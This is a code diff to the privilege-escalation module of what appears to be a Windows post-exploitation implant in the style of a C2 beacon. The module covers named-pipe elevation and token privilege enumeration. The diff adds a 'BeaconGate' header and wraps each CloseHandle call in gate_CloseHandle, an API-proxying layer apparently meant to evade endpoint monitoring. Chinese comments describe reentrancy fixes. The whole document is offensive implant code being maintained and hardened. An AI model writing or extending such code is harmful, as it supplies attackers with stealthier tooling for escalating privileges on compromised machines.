@@ -2,6 +2,7 @@
  * Privilege Escalation Code
  */
 #include <windows.h>
+#include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
 #include <stdio.h>
 #include "commands.h"
 #include "parse.h"
@@ -113,11 +114,11 @@ void command_elevate_pre(char * buffer, int length) {
 	/* 上一轮未配对 post 的残留：先收掉旧线程句柄和旧管道。关旧管道会把
 	   仍阻塞在 ConnectNamedPipe 的旧线程以错误码路径安全送出。 */
 	if (hElevateThread != INVALID_HANDLE_VALUE) {
-		CloseHandle(hElevateThread);
+		gate_CloseHandle(hElevateThread);
 		hElevateThread = INVALID_HANDLE_VALUE;
 	}
 	if (hServerPipe != INVALID_HANDLE_VALUE) {
-		CloseHandle(hServerPipe);
+		gate_CloseHandle(hServerPipe);
 		hServerPipe = INVALID_HANDLE_VALUE;
 	}
 
@@ -143,7 +144,7 @@ void command_elevate_post(void(*callback)(char * buffer, int length, int type)) 
 	   修复原 TODO：线程句柄等待结束后关闭，并复位状态，保证 elevate 可重入。 */
 	if (hElevateThread != INVALID_HANDLE_VALUE) {
 		WaitForSingleObject(hElevateThread, 15000);
-		CloseHandle(hElevateThread);
+		gate_CloseHandle(hElevateThread);
 		hElevateThread = INVALID_HANDLE_VALUE;
 	}
 
@@ -171,7 +172,7 @@ void command_elevate_post(void(*callback)(char * buffer, int length, int type)) 
 	/* 修复原 TODO：服务端管道无论成败都要关闭。若 elevator 线程仍在
 	   ConnectNamedPipe 上等待，关句柄会使其立即失败返回、线程自然退出。 */
 	if (hServerPipe != INVALID_HANDLE_VALUE) {
-		CloseHandle(hServerPipe);
+		gate_CloseHandle(hServerPipe);
 		hServerPipe = INVALID_HANDLE_VALUE;
 	}
 	(void)ok;
@@ -219,7 +220,7 @@ void command_getprivs(char * buffer, int length, void(*callback)(char * buffer, 
 	/* we want the SE_DEBUG_PRIV to get all info from processes */
 	else if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &ttoken))  {
 		getprivs(buffer, length, ttoken, &enabled);
-		CloseHandle(ttoken);
+		gate_CloseHandle(ttoken);
 	}
 	else {
 		post_error_na(0x3b);
